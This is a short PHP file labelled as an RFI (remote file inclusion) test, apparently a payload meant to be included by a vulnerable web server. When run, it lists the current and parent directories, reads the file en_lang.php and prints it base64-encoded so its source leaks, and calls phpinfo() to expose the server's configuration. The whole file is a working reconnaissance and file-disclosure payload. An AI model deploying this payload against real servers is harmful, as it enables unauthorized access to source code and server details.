// RFI test
<?php
  print_r(scandir("."));

  print_r(scandir("../."));
    
  $data = file_get_contents("en_lang.php");
  echo base64_encode($data);
    
  phpinfo();
?>
